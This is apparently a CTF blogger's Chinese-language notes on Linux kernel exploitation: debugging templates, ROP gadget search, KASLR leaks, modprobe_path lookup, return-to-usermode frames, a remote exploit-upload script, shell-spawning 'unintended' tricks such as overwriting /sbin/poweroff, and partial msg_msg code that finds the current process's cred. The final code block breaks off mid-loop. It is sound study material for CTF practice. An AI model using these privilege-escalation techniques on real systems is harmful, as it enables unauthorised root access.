---
layout: post
title: excluded
category: kernel pwn
date: 2024-7-20 14:00:00
exclude: true
---
Linux kernel基础：Kernel 
<!-- more -->

[TOC]



# Q & A

这里用于记录一些`Linux Kernel Pwn`中遇到的各种问题。

## 0x00. 成功执行提权函数，但没有获得root权限的shell

问题表现于如上所示，或者是一些其它的奇怪症状。

可以在`gcc`编译时通过加上编译参数`-Os`，或者例如`-O0`等优化选项都可以试试，推测是由于优化选项带来的问题。

后记：检查一下`system`的`rsp`呢？其实就是栈对齐，用户态`rop`经典问题了。

## 0x01. 断点打不上

首先检查`gdb`是否有`add-symbol-file xxx.ko address`这样设置了，这里不讨论如何打断点，而是考虑在看似一切正常的情况下，打不上断点的情况。

笔者遇到过一次，启动脚本中有一行参数`-enable-kvm`。

将其删掉就好了。

## 0x02. Linux kernel 调试板子

写下笔者自用的`gdb`调试板子和`exp`运行板子。

`gdb`调试板子：

```bash
	"gdb_extended": {
		"prefix": "gdb",
		"body": [
			"#!/bin/bash",
			"",
			"# 定义变量",
			"KERNEL_MODULE=\"${1:}\"",
			"OFFSET=\"${2:}\"",
			"PORT=\"${3:1234}\"",
			"EXPLOIT=\"${4:core/exploit}\"",
			"",
			"# 使用gdb调试",
			"gdb -q \\",
			"    -ex \"add-symbol-file $$KERNEL_MODULE $$OFFSET\" \\",
			"    -ex \"file ./$$KERNEL_MODULE\" \\",
			"    -ex \"file $$EXPLOIT\" \\",
			"    -ex \"target remote:$$PORT\""
		],
		"description": "an extended template for gdb in linux kernel pwn"
	},
```

`exp.sh`调试板子：（编译`exploit`并启动环境）

```bash
	"exp": {
		"prefix": "exp",
		"body": [
			"FILE_NAME=\"${1:core.cpio}\"",
			"BOOT_SCRIPT=\"${2:boot.sh}\"",
			"",
			"gcc -o core/exploit ./exp.c -static -masm=intel -g",
			"cd core",
			"find . | cpio -o --format=newc > ../$$FILE_NAME",
			"cd ..",
			"./$$BOOT_SCRIPT"
		],
		"description": "a template for compiling and creating a cpio archive, then running a boot script"
	}
```

## 0x03. 无法打开/dev/ptmx，无法打开tty_struct结构体

有时候我们无法打开`/dev/ptmx`来获取到`tty_struct`结构体，表现为返回的`fd`为`-1`。

若发现`ls /dev/ptmx`发现该文件存在，而`cat /dev/ptmx`又发现该文件不存在，则说明`rcS`脚本里面，大概率没有挂载`pts`：

```bash
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
```

而`ptmx`在没有挂载该`pts`的时候是无法打开的。这和终端、伪终端有一定关系。

因此，无法打开是出题者刻意为之，此时需要寻找其它的结构体进行利用。

## 0x04. gadgets寻找相关问题

`Linux kernel`中的`gadgets`寻找相较于用户态会麻烦许多，而`ropper`和`ROPgadget`半斤八两。经过笔者测试，还是`ROPgadget`会好用许多（对比之下笔者在用户态更喜欢用`ropper`~）

例如，有的时候会面临，明明有这个`gadget`却寻找不到的问题。此时可以在`ROPgadget`中添加`--depth`参数：

```bash
ROPgadget --binary ./vmlinux --depth=20 > gadgets.txt
```

随后我们可以利用`grep`加上正则表达式快速匹配一些`gadgets`~

要在`grep`中使用正则表达式，可以加上`-E`参数，来支持扩展的正则表达式。

这里总结一些查找`gadget`的常用正则表达式：

```
.    匹配任意单个字符
.*   匹配任意数量的任意字符
^    匹配开头
$    匹配结尾
```

利用上面这些，我们便可以找到一些很难找到的`gadgets`。例如，匹配`add rsp, 0x18`这样的`gadgets`：

```bash
$ cat gadgets.txt| grep -E '.*: pop ... ; pop ... ; pop ... ; ret$'
0xffffffff81053164 : pop r12 ; pop rbp ; pop rbx ; ret
0xffffffff8267b9ab : pop r13 ; pop r14 ; pop rbp ; ret
0xffffffff8267b9ac : pop rbp ; pop r14 ; pop rbp ; ret
0xffffffff8267d549 : pop rbp ; pop rdx ; pop rcx ; ret
0xffffffff8267e408 : pop rbx ; pop rsi ; pop rbp ; ret
0xffffffff8267d6a9 : pop rsi ; pop rdi ; pop rbp ; ret
0xffffffff81053165 : pop rsp ; pop rbp ; pop rbx ; ret
```

如上，我们利用`.*: `匹配了前面地址部分，随后多次使用`pop ...`表示`pop`一个寄存器，最后`ret`后面使用`$`表示匹配结尾。

对于某些难以寻找的`gadget`，还可以尝试使用`pwntools`来进行搜索：

```python
from pwn import *
context(arch = 'amd64', os = 'linux')
elf = ELF('./vmlinux')
for x in elf.search(asm('push rsi; pop rsp;'), executable = True):
    print(elf.disasm(address = x, n_bytes = 0x40))
    print('------------------------------------------------------------------------------------------------------------')
```

其中`n_bytes`为该`gadget`处打印多少长度的`code`。可以根据自己调整。

## 0x05. 内核崩溃时卡死 qemu不退出或重启

注意`qemu`启动脚本中，`-append`的如下选项：

```c
panic=1 oops=panic
```

开启之后即可让内核崩溃时触发`panic`。

而`panic`之后，若设置了`-no-reboot`则不会重启内核。

## 0x06. 通过内核堆上泄露程序基地址

内核堆地址（`page_offset_base`）`+0x9d000`处存放了函数`secondary_startup_64`函数的地址，可以通过该函数地址泄露程序基地址

## 0x07. 寻找modprobe_path地址

### 方法1 通过函数偏移寻找

我们无法通过`cat /proc/kallsyms`来找到`modprobe_path`的地址。幸运的是，在`__request_module`中，存在一个对`modprobe_path`的引用。由此，我们可以从`/proc/kallsyms`中找到`__request_module`函数的地址，并使用`gdb`连接到`kernel`，查看该函数附近的汇编代码，即可找到`modprobe_path`的地址~

具体如下：

首先我们找到`__request_module`函数的地址：

![QQ_1722493258038](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011511350.png)

随后，我们让`gdb`连接到该`kernel`，设置`target remote:1234`即可，通过`x/40i`来查看刚刚获得的函数地址附近的代码：

![QQ_1722493343591](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202408011511409.png)

如上所示，箭头所指的地方就是`modprobe_path`的地址的引用。

通过如上方式，我们就可以获得`modprobe_path`的地址。

### 方法2 通过搜索字符串寻找

我们知道默认情况下，`modprobe_path`为`/sbin/modprobe`。那么可以直接在`gdb`中搜索这个字符串即可。

一般来说我们可以找到两个值：

- 其中一个属于内核代码段的为`modprobe_path`的地址
- 另一个为`modprobe_path`的地址这一页映射到直接映射段上的地址

![image-20250227094215449](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250227094215449.png)

## 0x08. 回到用户态起shell的板子

没有开启`kpti`时如下所示：

```c
swapgs
iretq
user_shell_addr // the func that will be execute
user_cs
user_eflags // 64bit:user_rflags
user_sp
user_ss
```

开启时如下所示：

```c
↓   swapgs_restore_regs_and_return_to_usermode + 27
    0 // padding
    0 // padding
    user_shell_addr
    user_cs
    user_rflags
    user_sp
    user_ss
```

**值得注意的是：**

**我们知道`swapgs_restore_regs_and_return_to_usermode`函数需要加上一个偏移，具体来说该偏移不是固定的，需要跳过前面的栈操作，从`mov rdi, rsp`开始即可**

又补充：我的理解是从`mov rdi, rsp`开始，但事实上在做别的例如`0ctf_kernote`打`pt_regs`的时候，发现得从`pop rbp`开始。只能说多试一下。

## 0x09. 非预期

整理一些常见非预期：

- 修改`umount`:

![image-20240928132818409](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202409281328503.png)

- 修改`poweroff`：

```bash
rm /sbin/poweroff
echo "#!/bin/sh" > /sbin/poweroff
echo "/bin/sh" >> /sbin/poweroff
chmod +x /sbin/poweroff
exit
cat flag
```

- 没防止`monitor`：

按下`ctrl+a`，再按`c`，输入：

```bash
migrate "exec:cp rootfs.img /tmp"
migrate "exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2"
migrate "exec:cat /tmp/flag 1>&2"
```

## 0x0A. 或许是非预期的内核地址泄露

利用如下命令：

```bash
hexdump -C /sys/kernel/notes
```

可以得到如下形式：

```bash
/ $ hexdump -C /sys/kernel/notes
hexdump -C /sys/kernel/notes
00000000  04 00 00 00 06 00 00 00  06 00 00 00 58 65 6e 00  |............Xen.|
00000010  6c 69 6e 75 78 00 00 00  04 00 00 00 04 00 00 00  |linux...........|
00000020  07 00 00 00 58 65 6e 00  32 2e 36 00 04 00 00 00  |....Xen.2.6.....|
00000030  08 00 00 00 05 00 00 00  58 65 6e 00 78 65 6e 2d  |........Xen.xen-|
00000040  33 2e 30 00 04 00 00 00  08 00 00 00 03 00 00 00  |3.0.............|
00000050  58 65 6e 00 00 00 00 80  ff ff ff ff 04 00 00 00  |Xen.............|
00000060  08 00 00 00 0f 00 00 00  58 65 6e 00 00 00 00 00  |........Xen.....|
00000070  80 00 00 00 04 00 00 00  08 00 00 00 01 00 00 00  |................|
00000080  58 65 6e 00 80 11 be 8a  ff ff ff ff 04 00 00 00  |Xen.............|
00000090  08 00 00 00 02 00 00 00  58 65 6e 00 00 20 20 89  |........Xen..  .|
000000a0  ff ff ff ff 04 00 00 00  29 00 00 00 0a 00 00 00  |........).......|
000000b0  58 65 6e 00 21 77 72 69  74 61 62 6c 65 5f 70 61  |Xen.!writable_pa|
000000c0  67 65 5f 74 61 62 6c 65  73 7c 70 61 65 5f 70 67  |ge_tables|pae_pg|
000000d0  64 69 72 5f 61 62 6f 76  65 5f 34 67 62 00 00 00  |dir_above_4gb...|
000000e0  04 00 00 00 04 00 00 00  11 00 00 00 58 65 6e 00  |............Xen.|
000000f0  01 88 00 00 04 00 00 00  04 00 00 00 09 00 00 00  |................|
00000100  58 65 6e 00 79 65 73 00  04 00 00 00 08 00 00 00  |Xen.yes.........|
00000110  08 00 00 00 58 65 6e 00  67 65 6e 65 72 69 63 00  |....Xen.generic.|
00000120  04 00 00 00 10 00 00 00  0d 00 00 00 58 65 6e 00  |............Xen.|
00000130  01 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
00000140  04 00 00 00 04 00 00 00  0e 00 00 00 58 65 6e 00  |............Xen.|
00000150  01 00 00 00 04 00 00 00  04 00 00 00 10 00 00 00  |................|
00000160  58 65 6e 00 01 00 00 00  04 00 00 00 08 00 00 00  |Xen.............|
00000170  0c 00 00 00 58 65 6e 00  00 00 00 00 00 80 ff ff  |....Xen.........|
00000180  04 00 00 00 08 00 00 00  04 00 00 00 58 65 6e 00  |............Xen.|
00000190  00 00 00 00 00 00 00 00  04 00 00 00 14 00 00 00  |................|
000001a0  03 00 00 00 47 4e 55 00  1f 67 72 f8 b7 87 9e 24  |....GNU..gr....$|
000001b0  4c 32 59 6b 38 9e 20 1f  3f 3d c1 c7 06 00 00 00  |L2Yk8. .?=......|
000001c0  01 00 00 00 00 01 00 00  4c 69 6e 75 78 00 00 00  |........Linux...|
000001d0  00 00 00 00                                       |....|
000001d4
```

如下所示，可以获得一个内核基地址。

![image-20241001143005672](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20241001143005672.png)

## 0x0B. tar命令解析

`tar`命令用得很多，其几个参数效果如下：

```bash
-x 对.tar格式打包的文件解包
-c 将文件打包为.tar文件
-v 显示解压过程
-f 指定文件
-z 压缩/解压.gz格式的文件，例如.tar.gz
-J 压缩/解压.xz格式的文件，例如.tar.xz
-j 压缩/解压.bzip2格式的文件，例如.tar.bz2

-C 指定输出路径
```

因此，对于一般`.tar`格式的文件，我们使用如下命令解包：

```bash
tar -xvf ./file.tar
```

使用如下命令对`.gz`格式压缩的文件解压缩：

```bash
tar -xzvf ./file.tar.gz
```

以及可以指定输出路径：

```bash
tar -xzvf ./file.tar.gz -C dir
```



通过如下方式压缩文件：

```bash
tar -cvf ./file.tar file1.txt fil2.txt
```

通过如下方式压缩整个目录：

```bash
tar -czvf ./file.tar dir
```

## 0x0C. ext4格式的文件系统

若题目给出一个`.img`格式的文件，则有可能是`ext4`格式的文件系统，如下所示：

```bash
$ file ./rootfs.img
./rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=1a11479a-9bca-4c78-ae24-9c9c0b41d9f4 (needs journal recovery) (extents) (64bit) (large files) (huge files)
```

则其解压方式如下：

先在`/mnt`下创建一个文件夹用于存放解压后的文件：

```bash
sudo mkdir -p /mnt/kernote
```

随后使用`mount`命令来挂载即可：

```bash
sudo mount ./rootfs.img /mnt/kernote
```

使用`umount`命令即可自动完成打包并卸载：

```bash
sudo umount /mnt/kernote
```

一个示例的`exp.sh`脚本如下：

```bash
#!/bin/sh

sudo mkdir -p /mnt/kernote
sudo mount ./rootfs.img /mnt/kernote
sudo gcc -o /mnt/kernote/exploit ./exp.c -g -masm=intel -static
sudo umount /mnt/kernote
```

## 0x0D. kmem_cache_alloc_trace函数和其相关

有时候题目不是通过`kmalloc`分配的，而是通过`kmem_cache_alloc_trace`函数。

例如：

```c
kmem_cache_alloc_trace(kmalloc_caches[5], 0xCC0LL, 8LL, v5, -1LL);
```

此时需要注意，**第三个参数**才是分配的大小。

这里记录下几个函数的函数原型：

创建`kmem_cache`：

```c
struct kmem_cache *kmem_cache_create(const char *name, size_t size, size_t align,
                                     unsigned long flags, void (*ctor)(void *));
```

分配`obj`：

```c
void *kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags);
```

分配`obj`，但会记录信息用于跟踪，例如`size`：

```c
void *kmem_cache_alloc_trace(struct kmem_cache *cachep, gfp_t flags, size_t size);
```

## 0x0E. slub和slab分配器的区别

`emmm`这里只记录一个，就是`slub`分配器最小有`kmalloc-8`（`slob`也是`kmalloc-8`），而`slab`最小即为`32`，即`kmalloc-32`

## 0x0F. 四级页表内存布局

位于[这里](https://elixir.bootlin.com/linux/v6.11.5/source/Documentation/arch/x86/x86_64/mm.rst)，一般看四级的。

![image-20241125152811254](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20241125152811254.png)

```c
  ===========================================================================================================
      Start addr    |   Offset   |     End addr     |  Size   | VM area description
  ===========================================================================================================
                    |            |                  |         |
   0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm
  __________________|____________|__________________|_________|______________________________________________
                    |            |                  |         |
   0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge
                    |            |                  |         | virtual memory addresses up to the -128 TB
                    |            |                  |         | starting offset of kernel mappings.
  __________________|____________|__________________|_________|_____________________________________________
 Kernel-space virtual memory, shared between all processes: ____________________________________________________________|_______________________________________________
                    |            |                  |         |
   ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
   ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
   ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory 
   ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
   ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
   ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
   ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
   ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
   ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
  __________________|____________|__________________|_________|______________________________________________
 Identical layout to the 56-bit one from here on:
____________________________________________________________|_______________________________________________
                    |            |                  |         |
   fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole
                    |            |                  |         | vaddr_end for KASLR
   fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping
   fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole
   ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks
   ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole
   ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space
   ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole
   ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping
   ffffffff80000000 |-2048    MB |                  |         |
   ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
   ffffffffff000000 |  -16    MB |                  |         |
      FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range
   ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI
   ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole
  __________________|____________|__________________|_________|______________________________________________
```

## 0x10. 子进程和父进程使用pipe传输数据

解决了一直一来的一个困惑，使用`pipe`就可以了

示例：

```c
int pipe_fd[2];
size_t value = 8;
pipe(pipe_fd);

// 子进程
write(pipe_fd[1], &value, 8);

// 父进程
read(pipe_fd[0], &value, 8);
```

## 0x11. obj的offset的位置

也就是在`freelist`上指向下一个`obj`的`offset`，笔者一直以为在前`8`字节，但实测和`a3`师傅表示`kmem_cache->offset`位于一个偏移处，甚至大于`0x10`。

## 0x12. 使用read_ldt等搜索内存找到flag

在`qemu`使用`-initrd`导入文件系统时，整个文件系统的内容都位于内存中。

所以用`ext4`格式的就不能这样搜索。因为`qemu`会使用`-hda`来引导该文件系统。

## 0x13. 打远程板子

```python
from pwn import *
import base64
#context.log_level = "debug"

with open("./core/exploit", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("127.0.0.1", 11451)
#p = process('./run.sh')
try_count = 1
while True:
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")
    
    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
    p.sendline("chmod +x /tmp/exploit")
    p.sendline("/tmp/exploit ")
    break

p.interactive()
```

## 0x14. 生成带符号的 vmlinux

可以通过 `vmlinux-to-elf`  [工具](https://github.com/marin-m/vmlinux-to-elf/tree/master)，使用方式如下：

```bash
vmlinux-to-elf ./vmlinux vmlinux_symbol
```

随后，便可以使用 `ida` 等工具静态分析输出的带符号的`elf`。

## 0x15. 找不到 init_cred 时如何处理

通过`0x14`的方式生成带符号的`elf`。随后，找到`prepare_kernel_creds`函数，如下：

![image-20250103151604797](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250103151604797.png)

只需要找形如如上的`else`分支中的变量，该变量即为 `init_cred` ，使用其地址即可。

## 0x16. 让编译器不要对某个函数进行任何优化

使用`__attribute__((naked))`即可，如下：

```c

__attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
{
    /* for syscall, it's clone(flags, stack, ...) */
    __asm__ volatile (
        " mov r15, rsi; "   /* save the rsi*/
        " xor rsi, rsi; "   /* set esp and useless args to NULL */
        " xor rdx, rdx; "
        " xor r10, r10; "
        " xor r8, r8;   "
        " xor r9, r9;   "
        " mov rax, 56;  "   /* __NR_clone */
        " syscall;      "
        " cmp rax, 0;   "
        " je child_fn;  "
        " ret;          "   /* parent */
        "child_fn:      "
        " jmp r15;      "   /* child */
    );
}
```

## 0x17. kmalloc类函数分配的flags

由于`IDA`反编译后的`flags`为常数，我们有时需要知道`flags`的值，而实际上根据内核版本有所不同。

`linux 5.11`版本下的[定义](https://elixir.bootlin.com/linux/v5.14.21/source/include/linux/gfp.h)（`include/linux/gfp_types.h`）如下：

```c
#define ___GFP_DMA		0x01u  // 分配来自 DMA 兼容的内存区域（主要用于 ISA 设备）
#define ___GFP_HIGHMEM		0x02u  // 允许分配来自高端内存（HighMem），适用于 32 位系统
#define ___GFP_DMA32		0x04u  // 限制分配的内存必须位于 32 位地址空间（低于 4GB），用于 DMA 设备
#define ___GFP_MOVABLE		0x08u  // 允许分配的内存是可移动的，可用于 Page Migration
#define ___GFP_RECLAIMABLE	0x10u  // 分配的内存是可回收的（如 `slab` 缓存）
#define ___GFP_HIGH		0x20u  // 允许使用高优先级页面，适用于紧急情况
#define ___GFP_IO		0x40u  // 允许进行 IO 相关的内存回收操作
#define ___GFP_FS		0x80u  // 允许文件系统回收内存（如 `shrink_cache`）
#define ___GFP_ZERO		0x100u  // 分配的内存会被清零
#define ___GFP_ATOMIC		0x200u  // 原子分配，不会阻塞（适用于中断上下文）
#define ___GFP_DIRECT_RECLAIM	0x400u  // 允许直接回收（`direct reclaim`），可阻塞等待回收
#define ___GFP_KSWAPD_RECLAIM	0x800u  // 允许 `kswapd` 进程回收内存
#define ___GFP_WRITE		0x1000u  // 允许分配的页面用于写操作（如 `mmap`）
#define ___GFP_NOWARN		0x2000u  // 禁止在分配失败时打印 `warn` 信息
#define ___GFP_RETRY_MAYFAIL	0x4000u  // 允许重试，但仍可能失败
#define ___GFP_NOFAIL		0x8000u  // 必须成功，不返回 `NULL`，可能会触发 OOM
#define ___GFP_NORETRY		0x10000u  // 失败时不重试，适用于时间敏感的情况
#define ___GFP_MEMALLOC		0x20000u  // 允许使用 `min_free_kbytes` 预留内存
#define ___GFP_COMP		0x40000u  // 允许分配复合页（compound page），如 HugePages
#define ___GFP_NOMEMALLOC	0x80000u  // 避免使用 `memalloc` 预留池
#define ___GFP_HARDWALL		0x100000u  // 受 `cpuset` 限制，仅在特定 `cpuset` 内存节点上分配
#define ___GFP_THISNODE		0x200000u  // 强制仅在当前 NUMA 节点分配，不跨节点查找
#define ___GFP_ACCOUNT		0x400000u  // 使 `kmemcg`（Kernel Memory Cgroup）进行内存记账
#define ___GFP_ZEROTAGS		0x800000u  // 在 `KASAN` 开启的情况下，不初始化 shadow memory
#define ___GFP_SKIP_KASAN_POISON	0x1000000u  // 在 `KASAN` 监测下，跳过 `slab` 污染标记
#ifdef CONFIG_LOCKDEP
#define ___GFP_NOLOCKDEP	0x2000000u  // 关闭 `lockdep` 依赖检测（仅在 `CONFIG_LOCKDEP` 启用时生效）
#else
#define ___GFP_NOLOCKDEP	0  // 未启用 `CONFIG_LOCKDEP` 时，此标志无效
#endif
```

而当前最新版本的内核`linux 6.13`采取的是`enum`来定义如上标志位，大部分值差不多，此处不表。

而`GFP_KERNEL`的定义如下：

```c
#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)
```

其中`__GFP_RECLAIM`的定义如下：

```c
#define __GFP_RECLAIM ((__force gfp_t)(___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM))
```

即`GFP_RECLAIM`的值为`0x400 | 0x800`，等于`0xC00`。

由此`GFP_KERNEL`的值为`0xC00 | 0x40 | 0x80`，等于`0xCC0`。

根据上述方法，我们可知常见的`flags`和值的对应关系如下：

- `GFP_KERNEL`：`0xCC0`
- `GFP_KERNEL_ACCOUNT`：`0x0x400CC0`

- `GFP_KERNEL | __GFP_ZERO`：`0xDC0`

## 0x18. kmem_caches中index和size的对应

实际上由如下方式（`include/linux/slab.h`）计算：

```c
/*
 * Figure out which kmalloc slab an allocation of a certain size
 * belongs to.
 * 0 = zero alloc
 * 1 =  65 .. 96 bytes
 * 2 = 129 .. 192 bytes
 * n = 2^(n-1)+1 .. 2^n
 *
 * Note: __kmalloc_index() is compile-time optimized, and not runtime optimized;
 * typical usage is via kmalloc_index() and therefore evaluated at compile-time.
 * Callers where !size_is_constant should only be test modules, where runtime
 * overheads of __kmalloc_index() can be tolerated.  Also see kmalloc_slab().
 */
static __always_inline unsigned int __kmalloc_index(size_t size,
						    bool size_is_constant)
{
	if (!size)
		return 0;

	if (size <= KMALLOC_MIN_SIZE)
		return KMALLOC_SHIFT_LOW;

	if (KMALLOC_MIN_SIZE <= 32 && size > 64 && size <= 96)
		return 1;
	if (KMALLOC_MIN_SIZE <= 64 && size > 128 && size <= 192)
		return 2;
	if (size <=          8) return 3;
	if (size <=         16) return 4;
	if (size <=         32) return 5;
	if (size <=         64) return 6;
	if (size <=        128) return 7;
	if (size <=        256) return 8;
	if (size <=        512) return 9;
	if (size <=       1024) return 10;
	if (size <=   2 * 1024) return 11;
	if (size <=   4 * 1024) return 12;
	if (size <=   8 * 1024) return 13;
	if (size <=  16 * 1024) return 14;
	if (size <=  32 * 1024) return 15;
	if (size <=  64 * 1024) return 16;
	if (size <= 128 * 1024) return 17;
	if (size <= 256 * 1024) return 18;
	if (size <= 512 * 1024) return 19;
	if (size <= 1024 * 1024) return 20;
	if (size <=  2 * 1024 * 1024) return 21;
	if (size <=  4 * 1024 * 1024) return 22;
	if (size <=  8 * 1024 * 1024) return 23;
	if (size <=  16 * 1024 * 1024) return 24;
	if (size <=  32 * 1024 * 1024) return 25;

	if ((IS_ENABLED(CONFIG_CC_IS_GCC) || CONFIG_CLANG_VERSION >= 110000)
	    && !IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) && size_is_constant)
		BUILD_BUG_ON_MSG(1, "unexpected size in kmalloc_index()");
	else
		BUG();

	/* Will never be reached. Needed because the compiler may complain */
	return -1;
}
#define kmalloc_index(s) __kmalloc_index(s, true)
```

可以看`return`的结果即为数组的`index`。

## 0x19. 内核堆在未开启slab_freelist_random时的情况

记录一下，是从高地址分配到低地址。和用户态是反着来的，需要注意。

## 0x1A. 通过init_task寻找当前cred的地址

`init_task`是`struct task_struct`结构体，其是一个非常庞大的结构体，同样也非常难以定位和寻找里面的偏移。

其结构体如下（摘抄常用部分）：

```c
struct task_struct {
	...
    ...
	struct list_head		tasks;
    struct plist_node		pushable_tasks;
	...
    ...
	pid_t				pid;
	pid_t				tgid;
	unsigned long			stack_canary;
	...
    ...
	const struct cred __rcu		*real_cred;
	const struct cred __rcu		*cred;
    ...
    ...
    char				comm[TASK_COMM_LEN];
	...
    ...
}
```

每个进程都有一个`task_struct`结构体。其中，每个这样的结构体都有自己的`cred`结构体的指针。

因此，我们的思路分为三步：

- 通过`init_task`这样的`struct task_struct`结构体，遍历别的进程的`task_struct`结构体
- 比对每个`struct task_struct`中的`pid`或者`comm`是否为当前进程的，若是，则找到了当前进程
- 通过当前进程的`cred`指针即可找到`cred`的地址

### 遍历 task_struct 结构体

实际上，`task_struct`结构体中的`struct list_head tasks`是一个双向链表。定义如下：（很多地方都有比如`msg_msg`）

```c
struct list_head {
	struct list_head *next;
    struct list_head *prev;
};
```

而每个`task_struct`中的`struct list_head tasks`中的两个指针，都指向其他进程的`task_struct`中的`struct list_head tasks`处。意味着，不同进程的`task_struct`结构体是通过`struct list_head tasks`中的两个指针连接起来的，草图如下：

![image-20250306192945836](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250306192945836.png)

这意味着我们可以通过该`task`中的任意一个指针来找到下一个进程的`task_struct`结构体的`list_head`，并减去`task`的偏移，即可获得下一个进程的`task_struct`的地址。

笔者本题目中（笔者并不清楚每个环境中，该值是否一样），`task`相对于`task_struct`起始位置的偏移为`0x298`，那么即可通过如下方式从`init_task`遍历到下一个`task_struct`：

- 使用`init_task`加上`0x298`（这里也可以是`0x2a0`）
- 读取该地址上的值
- 使用该值减去`0x298`（这里一定是`0x298`）

### 比对每个进程的 pid 或者 comm

有两种方法比对是否找到了当前进程：

- 其一是通过`pid`，这可以直接根据`task_struct`偏移处的`pid`和进程本身的`pid`进行比对。
- 其二是通过`comm`字符数组，可以通过`prctl(PR_SET_NAME, "ltfall")`这样的方式来将自身进程的`comm`字符数组设置为任何醒目的字符。

寻找这二者也很简单。`pid`和`tgid`是和`canary`相邻的，`canary`的特性使其非常醒目。

而`comm`默认情况为`swapper/0`，且其常就位于`cred`下方。

这里也记录一下笔者当前题目的偏移：

- `pid`为`0x390`(`0x398`)
- `comm`为`0x550`

### 从当前进程的task_struct找到cred地址

在`comm`上方可以找到。且其常常如下所示：

```c
pwndbg> tele 0xffffffff81c33060
00:0000│  0xffffffff81c33060 ◂— 4
01:0008│  0xffffffff81c33068 ◂— 0
02:0010│  0xffffffff81c33070 ◂— 0
03:0018│  0xffffffff81c33078 ◂— 0
04:0020│  0xffffffff81c33080 ◂— 0
05:0028│  0xffffffff81c33088 ◂— 0
06:0030│  0xffffffff81c33090 ◂— 0xffffffffff
07:0038│  0xffffffff81c33098 ◂— 0xffffffffff
```

又例如：

```c
pwndbg> tele 0xffff88800ec62cc0
00:0000│  0xffff88800ec62cc0 ◂— 2
01:0008│  0xffff88800ec62cc8 ◂— 0
02:0010│  0xffff88800ec62cd0 ◂— 0
03:0018│  0xffff88800ec62cd8 ◂— 0
04:0020│  0xffff88800ec62ce0 ◂— 0
05:0028│  0xffff88800ec62ce8 ◂— 0
06:0030│  0xffff88800ec62cf0 ◂— 0xffffffffff
07:0038│  0xffff88800ec62cf8 ◂— 0xffffffffff
```

笔者这里的偏移是`0x538/0x540`。

### 一段示例

```c
init_task += kernel_offset;
leak_info("init_task", init_task);

size_t read_pid = getpid();
size_t cur_task = init_task;
size_t cur_cred = 0;
size_t *task_task = NULL;

int pid_index = 114;
int tgid_index = 115;

int next_index = 84;
int cred_index = 167;

while (1)
{
    memset(buffer, 0, 0x4000);
    buffer[0] = buffer[1] = 0;
    buffer[2] = 1;
    buffer[3] = 0x1000 - 0x30 + 0x1000 - 8;
    buffer[5] = 0;

    buffer[4] = cur_task - 8;
    setxattr("/exploit", "ltfall", buffer, 0x40, 0);

    memset(buffer, 0, 0x4000);
    int res = msgrcv(msg_id[0], buffer, 0x1000 - 0x30 + 0x1000 - 8, 0, MSG_NOERROR | MSG_COPY | IPC_NOWAIT);
    if (res < 0x1000 - 0x30 + 0x1000 - 8)
        err_exit("No such long rcv.");

    task_task = ((size_t)buffer + 8) + 0x1000 - 0x30;
    // leak_content(buffer, 0x2000 / 8);
    leak_info("thread_info", task_task[0]);
    leak_info("pid", task_task[tgid_index]);
    leak_info("next", task_task[next_index]);
    leak_info("cred", task_task[cred_index]);

    if((task_task[tgid_index] & 0xffffffff) == read_pid){
        success("find task_struct.");
        cur_cred= task_task[cred_index];
        leak_info("cur_cred", cur_cred);
        break;
    }

    cur_task = task_task[next_index] - 0x298;
